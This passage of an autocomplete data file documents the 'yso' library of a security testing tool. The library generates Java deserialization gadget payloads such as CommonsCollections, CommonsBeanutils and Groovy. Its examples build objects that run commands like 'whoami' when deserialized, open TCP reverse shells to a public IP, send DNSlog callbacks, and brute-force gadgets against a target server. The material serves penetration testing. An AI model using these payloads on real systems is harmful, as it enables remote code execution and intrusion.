            document: "",
            definitionStr:
              'GetGroovy1JavaObject(cmd string) (*JavaObject, error)  doc:GetGroovy1JavaObject 基于Groovy1 序列化模板生成并返回一个Java对象。\n\n这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。\n\ncmd：要设置在Java对象中的命令字符串。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand := "ls" // 假设的命令字符串\njavaObject, _ = yso.GetGroovy1JavaObject(command)\ngadgetBytes,_ = yso.ToBytes(javaObject)\nhexPayload = codec.EncodeToHex(gadgetBytes)\nprintln(hexPayload)\n```\n',
          },
          {
            functionName: "GetGadgetNameByFun(${1:i})",
            document: "",
            definitionStr: "GetGadgetNameByFun(i any) (string, error)",
          },
          {
            functionName: "GetGadget(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'GetGadget(name string, opts ...any) (*JavaObject, error)  doc:GenerateGadget this is a highly flexible function that can generate a Java object by three different ways:\n\n 1. Generate a Java object that have no any params.\n\n    Example: GenerateGadget("CommonsCollections1")\n 2. Generate a Java object that have one param and implement by TemplateImpl, the first param is the name of the gadget, the second param is the class name, the third param is the class param.\n    Example: GenerateGadget("CommonsCollections2", "Sleep", "1000")\n 3. Generate a Java object that have multiple params and implement by TemplateImpl, the first param is the name of the gadget, the second param is the class name, the third param is the class param map.\n    Example: GenerateGadget("CommonsCollections2", "TcpReverseShell", map[string]string{"host": "127.0.0.1","port":"8080"})\n 4. Generate a Java object that have one param and implement by TransformChain, the first param is the name of the gadget, the second param is the transform chain name, the third param is the param.\n    Example: GenerateGadget("CommonsCollections1", "dnslog", "xxx.xx.com")\n 5. Generate a Java object that have multiple params and implement by TransformChain, the first param is the name of the gadget, the second param is the transform chain name, the third param is the param map.\n    Example: GenerateGadget("CommonsCollections1", "loadjar", map[string]string{"url": "xxx.com", "name": "exp"})\n 6. Generate a Java object that implement by TemplateImpl.\n    Example: GenerateGadget("CommonsCollections2", useRuntimeExecEvilClass("whoami"))\n',
          },
          {
            functionName:
              "GetFindGadgetByDNSJavaObject(${1:url /*type: string*/})",
            document: "",
            definitionStr:
              "GetFindGadgetByDNSJavaObject(url string) (*JavaObject, error)  doc:GetFindGadgetByDNSJavaObject 通过 DNSLOG 探测 CLass Name，进而探测 Gadget。\n\n使用预定义的FindGadgetByDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。\n\nurl：要在生成的Java对象中设置的URL字符串。\n\n返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\nurl, token, _ = risk.NewDNSLogDomain()\njavaObject, _ = yso.GetFindGadgetByDNSJavaObject(url)\ngadgetBytes,_ = yso.ToBytes(javaObject)\n使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器\nres,err = risk.CheckDNSLogByToken(token)\n\n\tif err {\n\t  //dnslog查询失败\n\t} else {\n\t  if len(res) > 0{\n\t   // dnslog查询成功\n\t  }\n\t}\n\n```\n",
          },
          {
            functionName:
              "GetCommonsCollectionsK4JavaObject(${1:cmd /*type: string*/})",
            document: "",
            definitionStr:
              'GetCommonsCollectionsK4JavaObject(cmd string) (*JavaObject, error)  doc:GetCommonsCollectionsK4JavaObject 基于Commons Collections K4 序列化模板生成并返回一个Java对象。\n\n这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。\n\ncmd：要设置在Java对象中的命令字符串。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand := "ls" // 假设的命令字符串\njavaObject, _ = yso.GetCommonsCollectionsK4JavaObject(command)\ngadgetBytes,_ = yso.ToBytes(javaObject)\nhexPayload = codec.EncodeToHex(gadgetBytes)\nprintln(hexPayload)\n```\n',
          },
          {
            functionName:
              "GetCommonsCollectionsK3JavaObject(${1:cmd /*type: string*/})",
            document: "",
            definitionStr:
              'GetCommonsCollectionsK3JavaObject(cmd string) (*JavaObject, error)  doc:GetCommonsCollectionsK3JavaObject 基于Commons Collections K3 序列化模板生成并返回一个Java对象。\n\n这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。\n\ncmd：要设置在Java对象中的命令字符串。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand := "ls" // 假设的命令字符串\njavaObject, _ = yso.GetCommonsCollectionsK3JavaObject(command)\ngadgetBytes,_ = yso.ToBytes(javaObject)\nhexPayload = codec.EncodeToHex(gadgetBytes)\nprintln(hexPayload)\n```\n',
          },
          {
            functionName: "GetCommonsCollectionsK2JavaObject(${1:options...})",
            document: "",
            definitionStr:
              'GetCommonsCollectionsK2JavaObject(options ...GenClassOptionFun) (*JavaObject, error)  doc:GetCommonsCollectionsK2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。\n\n通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。\n\n这些函数使用户能够定制生成的Java对象的特定属性或行为。\n\noptions：用于配置Java对象的可变参数函数列表。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand = "whoami"\nclassName = "KEsBXTRS"\ngadgetObj,err = yso.GetCommonsCollectionsK2JavaObject(\n\n\tyso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令\n\tyso.obfuscationClassConstantPool(),\n\tyso.evilClassName(className), // 指定恶意类的名称\n\n)\n```\n',
          },
          {
            functionName: "GetCommonsCollectionsK1JavaObject(${1:options...})",
            document: "",
            definitionStr:
              'GetCommonsCollectionsK1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)  doc:GetCommonsCollectionsK1JavaObject 基于Commons Collections <=3.2.1 序列化模板生成并返回一个Java对象。\n\n通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。\n\n这些函数使用户能够定制生成的Java对象的特定属性或行为。\n\noptions：用于配置Java对象的可变参数函数列表。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand = "whoami"\nclassName = "KEsBXTRS"\ngadgetObj,err = yso.GetCommonsCollectionsK1JavaObject(\n\n\tyso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令\n\tyso.obfuscationClassConstantPool(),\n\tyso.evilClassName(className), // 指定恶意类的名称\n\n)\n```\n',
          },
          {
            functionName: "GetCommonsCollections8JavaObject(${1:options...})",
            document: "",
            definitionStr:
              'GetCommonsCollections8JavaObject(options ...GenClassOptionFun) (*JavaObject, error)  doc:GetCommonsCollections8JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。\n\n通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。\n\n这些函数使用户能够定制生成的Java对象的特定属性或行为。\n\noptions：用于配置Java对象的可变参数函数列表。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand = "whoami"\nclassName = "KEsBXTRS"\ngadgetObj,err = yso.GetCommonsCollections8JavaObject(\n\n\tyso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令\n\tyso.obfuscationClassConstantPool(),\n\tyso.evilClassName(className), // 指定恶意类的名称\n\n)\n```\n',
          },
          {
            functionName:
              "GetCommonsCollections7JavaObject(${1:cmd /*type: string*/})",
            document: "",
            definitionStr:
              'GetCommonsCollections7JavaObject(cmd string) (*JavaObject, error)  doc:GetCommonsCollections7JavaObject 基于Commons Collections 7 序列化模板生成并返回一个Java对象。\n\n这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。\n\ncmd：要设置在Java对象中的命令字符串。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand := "ls" // 假设的命令字符串\njavaObject, _ = yso.GetCommonsCollections7JavaObject(command)\ngadgetBytes,_ = yso.ToBytes(javaObject)\nhexPayload = codec.EncodeToHex(gadgetBytes)\nprintln(hexPayload)\n```\n',
          },
          {
            functionName:
              "GetCommonsCollections6JavaObject(${1:cmd /*type: string*/})",
            document: "",
            definitionStr:
              'GetCommonsCollections6JavaObject(cmd string) (*JavaObject, error)  doc:GetCommonsCollections6JavaObject 基于Commons Collections 6 序列化模板生成并返回一个Java对象。\n\n这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。\n\ncmd：要设置在Java对象中的命令字符串。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand := "ls" // 假设的命令字符串\njavaObject, _ = yso.GetCommonsCollections6JavaObject(command)\ngadgetBytes,_ = yso.ToBytes(javaObject)\nhexPayload = codec.EncodeToHex(gadgetBytes)\nprintln(hexPayload)\n```\n',
          },
          {
            functionName:
              "GetCommonsCollections5JavaObject(${1:cmd /*type: string*/})",
            document: "",
            definitionStr:
              'GetCommonsCollections5JavaObject(cmd string) (*JavaObject, error)  doc:GetCommonsCollections5JavaObject 基于Commons Collections 2 序列化模板生成并返回一个Java对象。\n\n这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。\n\ncmd：要设置在Java对象中的命令字符串。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand := "ls" // 假设的命令字符串\njavaObject, _ = yso.GetCommonsCollections5JavaObject(command)\ngadgetBytes,_ = yso.ToBytes(javaObject)\nhexPayload = codec.EncodeToHex(gadgetBytes)\nprintln(hexPayload)\n```\n',
          },
          {
            functionName: "GetCommonsCollections4JavaObject(${1:options...})",
            document: "",
            definitionStr:
              'GetCommonsCollections4JavaObject(options ...GenClassOptionFun) (*JavaObject, error)  doc:GetCommonsCollections4JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。\n\n通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。\n\n这些函数使用户能够定制生成的Java对象的特定属性或行为。\n\noptions：用于配置Java对象的可变参数函数列表。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand = "whoami"\nclassName = "KEsBXTRS"\ngadgetObj,err = yso.GetCommonsCollections4JavaObject(\n\n\tyso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令\n\tyso.obfuscationClassConstantPool(),\n\tyso.evilClassName(className), // 指定恶意类的名称\n\n)\n```\n',
          },
          {
            functionName: "GetCommonsCollections3JavaObject(${1:options...})",
            document: "",
            definitionStr:
              'GetCommonsCollections3JavaObject(options ...GenClassOptionFun) (*JavaObject, error)  doc:GetCommonsCollections3JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。\n\n通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。\n\n这些函数使用户能够定制生成的Java对象的特定属性或行为。\n\noptions：用于配置Java对象的可变参数函数列表。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand = "whoami"\nclassName = "KEsBXTRS"\ngadgetObj,err = yso.GetCommonsCollections3JavaObject(\n\n\tyso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令\n\tyso.obfuscationClassConstantPool(),\n\tyso.evilClassName(className), // 指定恶意类的名称\n\n)\n```\n',
          },
          {
            functionName: "GetCommonsCollections2JavaObject(${1:options...})",
            document: "",
            definitionStr:
              'GetCommonsCollections2JavaObject(options ...GenClassOptionFun) (*JavaObject, error)  doc:GetCommonsCollections2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。\n\n通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。\n\n这些函数使用户能够定制生成的Java对象的特定属性或行为。\n\noptions：用于配置Java对象的可变参数函数列表。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand = "whoami"\nclassName = "KEsBXTRS"\ngadgetObj,err = yso.GetCommonsCollections2JavaObject(\n\n\tyso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令\n\tyso.obfuscationClassConstantPool(),\n\tyso.evilClassName(className), // 指定恶意类的名称\n\n)\n```\n',
          },
          {
            functionName:
              "GetCommonsCollections1JavaObject(${1:cmd /*type: string*/})",
            document: "",
            definitionStr:
              'GetCommonsCollections1JavaObject(cmd string) (*JavaObject, error)  doc:GetCommonsCollections1JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。\n\n这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。\n\ncmd：要设置在Java对象中的命令字符串。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand := "ls" // 假设的命令字符串\njavaObject, err := yso.GetCommonsCollections1JavaObject(command)\ngadgetBytes,_ = yso.ToBytes(javaObject)\nhexPayload = codec.EncodeToHex(gadgetBytes)\nprintln(hexPayload)\n```\n',
          },
          {
            functionName: "GetCommonsBeanutils1JavaObject(${1:options...})",
            document: "",
            definitionStr:
              'GetCommonsBeanutils1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)  doc:GetCommonsBeanutils1JavaObject 基于Commons Beanutils 1 序列化模板生成并返回一个Java对象。\n\n通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。\n\n这些函数使用户能够定制生成的Java对象的特定属性或行为。\n\noptions：用于配置Java对象的可变参数函数列表。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand = "whoami"\nclassName = "KEsBXTRS"\ngadgetObj,err = yso.GetCommonsBeanutils1JavaObject(\n\n\t yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令\n\t\tyso.obfuscationClassConstantPool(),\n\t\tyso.evilClassName(className), // 指定恶意类的名称\n\n)\n```\n',
          },
          {
            functionName: "GetCommonsBeanutils192NOCCJavaObject(${1:options...})",
            document: "",
            definitionStr:
              'GetCommonsBeanutils192NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error)  doc:GetCommonsBeanutils192NOCCJavaObject 基于Commons Beanutils 1.9.2 序列化模板生成并返回一个Java对象。\n\n去除了对 commons-collections:3.1 的依赖。\n\n通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。\n\n这些函数使用户能够定制生成的Java对象的特定属性或行为。\n\noptions：用于配置Java对象的可变参数函数列表。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand = "whoami"\nclassName = "KEsBXTRS"\ngadgetObj,err = yso.GetCommonsBeanutils192NOCCJavaObject(\n\n\tyso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令\n\tyso.obfuscationClassConstantPool(),\n\tyso.evilClassName(className), // 指定恶意类的名称\n\n)\n```\n',
          },
          {
            functionName: "GetCommonsBeanutils183NOCCJavaObject(${1:options...})",
            document: "",
            definitionStr:
              'GetCommonsBeanutils183NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error)  doc:GetCommonsBeanutils183NOCCJavaObject 基于Commons Beanutils 1.8.3 序列化模板生成并返回一个Java对象。\n\n去除了对 commons-collections:3.1 的依赖。\n\n通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。\n\n这些函数使用户能够定制生成的Java对象的特定属性或行为。\n\noptions：用于配置Java对象的可变参数函数列表。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand = "whoami"\nclassName = "KEsBXTRS"\ngadgetObj,err = yso.GetCommonsBeanutils183NOCCJavaObject(\n\n\tyso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令\n\tyso.obfuscationClassConstantPool(),\n\tyso.evilClassName(className), // 指定恶意类的名称\n\n)\n```\n',
          },
          {
            functionName: "GetClick1JavaObject(${1:options...})",
            document: "",
            definitionStr:
              'GetClick1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)  doc:GetClick1JavaObject 基于Click1 序列化模板生成并返回一个Java对象。\n\n用户可以通过可变参数`options`提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。\n\n这些函数允许用户定制生成的Java对象的特定属性或行为。\n\noptions：用于配置Java对象的可变参数函数列表。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand = "whoami"\nclassName = "KEsBXTRS"\ngadgetObj,err = yso.GetClick1JavaObject(\n\n\tyso.useRuntimeExecEvilClass(command),\n\tyso.obfuscationClassConstantPool(),\n\tyso.evilClassName(className),\n\t)\n\n```\n',
          },
          {
            functionName: "GetBeanShell1JavaObject(${1:cmd /*type: string*/})",
            document: "",
            definitionStr:
              'GetBeanShell1JavaObject(cmd string) (*JavaObject, error)  doc:GetBeanShell1JavaObject 基于BeanShell1 序列化模板生成并返回一个Java对象。\n\n它首先解析预定义的BeanShell1序列化模板，然后在解析出的第一个Java对象中替换预设的占位符为传入的命令字符串。\n\ncmd：要传入Java对象的命令字符串。\n\n返回：成功时返回修改后的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand := "ls" // 假设的命令字符串\njavaObject, err := yso.GetBeanShell1JavaObject(command)\ngadgetBytes,_ = yso.ToBytes(javaObject)\nhexPayload = codec.EncodeToHex(gadgetBytes)\nprintln(hexPayload)\n```\n',
          },
          {
            functionName: "GetAllTemplatesGadget()",
            document: "",
            definitionStr:
              'GetAllTemplatesGadget() []TemplatesGadget  doc:GetAllTemplatesGadget 获取所有支持模板的Gadget，可用于爆破 gadget\n\nExample:\n```\n\n\tfor _, gadget := range yso.GetAllTemplatesGadget() {\n\t\tdomain := "xxx.dnslog" // dnslog 地址\n\t\tjavaObj, err := gadget(yso.useDNSLogEvilClass(domain))\n\t\tif javaObj == nil || err != nil {\n\t\t\tcontinue\n\t\t}\n\t\tobjBytes, err := yso.ToBytes(javaObj)\n\t\tif err != nil {\n\t\t\tcontinue\n\t\t}\n\t\t// 发送 objBytes\n\t}\n\n```\n',
          },
          {
            functionName: "GetAllRuntimeExecGadget()",
            document: "",
            definitionStr:
              'GetAllRuntimeExecGadget() []RuntimeExecGadget  doc:GetAllRuntimeExecGadget 获取所有的支持的RuntimeExecGadget，可用于爆破 gadget\n\nExample:\n```\n\n\tcommand := "whoami" // 假设的命令字符串\n\tfor _, gadget := range yso.GetAllRuntimeExecGadget() {\n\t\tjavaObj, err := gadget(command)\n\t\tif javaObj == nil || err != nil {\n\t\t\tcontinue\n\t\t}\n\t\tobjBytes, err := yso.ToBytes(javaObj)\n\t\tif err != nil {\n\t\t\tcontinue\n\t\t}\n\t\t// 发送 objBytes\n\t}\n\n```\n',
          },
          {
            functionName: "GetAllGadget()",
            document: "",
            definitionStr: "GetAllGadget() []any",
          },
          {
            functionName: "GenerateTomcatEchoClassObject(${1:options...})",
            document: "",
            definitionStr:
              'GenerateTomcatEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)  doc:GenTomcatEchoClassObject\n\nGenerateTomcatEchoEvilClassObject 生成一个使用TomcatEcho类模板的javaclassparser.ClassObject对象，\n\noptions：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。\n\n返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\nbody 回显\nbodyClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useEchoBody(),yso.useParam("Body Echo Check"))\nheader 回显\nheaderClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useHeaderParam("Echo","Header Echo Check"))\n```\n',
          },
          {
            functionName:
              "GenerateTcpReverseShellEvilClassObject(${1:host /*type: string*/}, ${2:port /*type: int*/}, ${3:options...})",
            document: "",
            definitionStr:
              'GenerateTcpReverseShellEvilClassObject(host string, port int, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)  doc:GenTcpReverseShellClassObject\n\nGenerateTcpReverseShellEvilClassObject 生成一个使用TcpReverseShell类模板的javaclassparser.ClassObject对象，\n\n这个函数结合使用 useTcpReverseShellTemplate ，tcpReverseShellHost ，tcpReverseShellPort 函数， 以生成在反序列化时会反连指定的 tcpReverseShellHost ，tcpReverseShellPort 的Java对象。\n\nhost：要设置的 tcpReverseShellHost 的host。\n\nport：要设置的 tcpReverseShellPort 的port。\n\noptions：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。\n\n返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\nhost = "公网IP"\nclassObject, err := yso.GenerateTcpReverseShellEvilClassObject(host,8080,additionalOptions...) // 生成并配置TcpReverseShell Java对象\n```\n',
          },
          {
            functionName:
              "GenerateTcpReverseEvilClassObject(${1:host /*type: string*/}, ${2:port /*type: int*/}, ${3:options...})",
            document: "",
            definitionStr:
              'GenerateTcpReverseEvilClassObject(host string, port int, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)  doc:GenTcpReverseClassObject\n\nGenerateTcpReverseEvilClassObject 生成一个使用TcpReverse类模板的javaclassparser.ClassObject对象，\n\n这个函数结合使用 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 函数， 以生成在反序列化时会反连指定的 tcpReverseHost ，tcpReversePort 的Java对象。\n\nhost：要设置的 tcpReverseHost 的host。\n\nport：要设置的 tcpReversePort 的port。\n\noptions：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。\n\n返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\nhost = "公网IP"\ntoken = uuid()\nclassObject, err := yso.GenerateTcpReverseEvilClassObject(host,8080,yso.tcpReverseToken(token),additionalOptions...) // 生成并配置TcpReverse Java对象\n```\n',
          },
          {
            functionName: "GenerateSpringEchoEvilClassObject(${1:options...})",
            document: "",
            definitionStr:
              'GenerateSpringEchoEvilClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)  doc:GenerateSpringEchoEvilClassObject 生成一个使用SpringEcho类模板的javaclassparser.ClassObject对象，\n\n这个函数结合使用 useSpringEchoTemplate 和 springParam 函数， 以生成在反序列化时会回显指定内容的Java对象。\n\noptions：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。\n\n返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\nclassObject, err := yso.GenerateSpringEchoEvilClassObject(yso.springHeader("Echo","Echo Check")) // 生成并配置SpringEcho Java对象\n```\n',
          },
          {
            functionName: "GenerateSleepClassObject(${1:options...})",
            document: "",
            definitionStr:
              "GenerateSleepClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)  doc:GenSleepClassObject\n\nGenerateSleepClassObject 生成一个使用Sleep类模板的javaclassparser.ClassObject对象\n\noptions：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。\n\n返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\nyso.GenerateSleepClassObject(yso.useSleepTime(5))\n```\n",
          },
          {
            functionName:
              "GenerateRuntimeExecEvilClassObject(${1:cmd /*type: string*/}, ${2:options...})",
            document: "",
            definitionStr:
              'GenerateRuntimeExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)  doc:GenerateRuntimeExecEvilClassObject 生成一个使用RuntimeExec类模板的javaclassparser.ClassObject对象，\n\n并设置一个指定的命令来执行。这个函数结合使用SetClassRuntimeExecTemplate和SetExecCommand函数，\n\n以生成在反序列化时会执行特定命令的Java对象。\n\ncmd：要在生成的Java对象中执行的命令字符串。\n\noptions：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。\n\n返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand := "ls" // 假设的命令字符串\nclassObject, err := yso.GenerateRuntimeExecEvilClassObject(command, additionalOptions...) // 生成并配置RuntimeExec Java对象\n```\n',
          },
          {
            functionName:
              "GenerateProcessImplExecEvilClassObject(${1:cmd /*type: string*/}, ${2:options...})",
            document: "",
            definitionStr:
              'GenerateProcessImplExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)  doc:GenerateProcessImplExecEvilClassObject 生成一个使用ProcessImplExec类模板的javaclassparser.ClassObject对象，\n\n并设置一个指定的命令来执行。这个函数结合使用SetClassProcessImplExecTemplate和SetExecCommand函数，\n\n以生成在反序列化时会执行特定命令的Java对象。\n\ncmd：要在生成的Java对象中执行的命令字符串。\n\noptions：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。\n\n返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand := "ls" // 假设的命令字符串\nclassObject, err := yso.GenerateProcessImplExecEvilClassObject(command, additionalOptions...) // 生成并配置ProcessImplExec Java对象\n```\n',
          },
          {
            functionName:
              "GenerateProcessBuilderExecEvilClassObject(${1:cmd /*type: string*/}, ${2:options...})",
            document: "",
            definitionStr:
              'GenerateProcessBuilderExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)  doc:GenerateProcessBuilderExecEvilClassObject 生成一个使用ProcessBuilderExec类模板的javaclassparser.ClassObject对象，\n\n并设置一个指定的命令来执行。这个函数结合使用SetClassProcessBuilderExecTemplate和SetExecCommand函数，\n\n以生成在反序列化时会执行特定命令的Java对象。\n\ncmd：要在生成的Java对象中执行的命令字符串。\n\noptions：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。\n\n返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand := "ls" // 假设的命令字符串\nclassObject, err := yso.GenerateProcessBuilderExecEvilClassObject(command, additionalOptions...) // 生成并配置ProcessBuilderExec Java对象\n```\n',
          },
          {
            functionName: "GenerateMultiEchoClassObject(${1:options...})",
            document: "",
            definitionStr:
              'GenerateMultiEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)  doc:GenMultiEchoClassObject\n\nGenerateMultiEchoEvilClassObject 生成一个使用 MultiEcho 类模板的javaclassparser.ClassObject对象，主要用于 Tomcat/Weblogic 回显，\n\noptions：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。\n\n返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\nbody 回显\nbodyClassObj,_ = yso.GenerateMultiEchoEvilClassObject(yso.useEchoBody(),yso.useParam("Body Echo Check"))\nheader 回显\nheaderClassObj,_ = yso.GenerateMultiEchoEvilClassObject(yso.useHeaderParam("Echo","Header Echo Check"))\n```\n',
          },
          {
            functionName:
              "GenerateModifyTomcatMaxHeaderSizeEvilClassObject(${1:options...})",
            document: "",
            definitionStr:
              "GenerateModifyTomcatMaxHeaderSizeEvilClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)  doc:GenerateModifyTomcatMaxHeaderSizeEvilClassObject 生成一个使用ModifyTomcatMaxHeaderSize类模板的javaclassparser.ClassObject对象，\n\n这个函数结合使用 useModifyTomcatMaxHeaderSizeTemplate 函数， 以生成在反序列化时会修改 tomcat 的 MaxHeaderSize 值的Java对象。\n\noptions：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。\n\n返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\nclassObject, err := yso.GenerateModifyTomcatMaxHeaderSizeEvilClassObject() // 生成并配置ModifyTomcatMaxHeaderSize Java对象\n```\n",
          },
          {
            functionName: "GenerateHeaderEchoClassObject(${1:options...})",
            document: "",
            definitionStr:
              'GenerateHeaderEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)  doc:GenHeaderEchoClassObject\n\nGenerateHeaderEchoClassObject 生成一个使用HeaderEcho类模板的javaclassparser.ClassObject对象，\n\noptions：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。\n\n返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\nheaderClassObj,_ = yso.GenerateHeaderEchoClassObject(yso.useHeaderParam("Echo","Header Echo Check"))\n```\n',
          },
          {
            functionName:
              "GenerateDNSlogEvilClassObject(${1:domain /*type: string*/}, ${2:options...})",
            document: "",
            definitionStr:
              'GenerateDNSlogEvilClassObject(domain string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)  doc:GenDnslogClassObject\n\nGenerateDnslogEvilClassObject 生成一个使用Dnslog类模板的javaclassparser.ClassObject对象，\n\n并设置一个指定的 Dnslog 域名。这个函数结合使用 useDNSlogTemplate 和 dnslogDomain 函数，\n\n以生成在反序列化时会向指定的 Dnslog 域名发送请求的Java对象。\n\ndomain：要在生成的Java对象中请求的 Dnslog 域名。\n\noptions：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。\n\n返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ndomain := "dnslog.com" // 假设的 Dnslog 域名\nclassObject, err := yso.GenerateDnslogEvilClassObject(domain, additionalOptions...) // 生成并配置Dnslog Java对象\n```\n',
          },
          {
            functionName:
              "GenerateClassObjectFromBytes(${1:bytes /*type: []byte*/}, ${2:options...})",
            document: "",
            definitionStr:
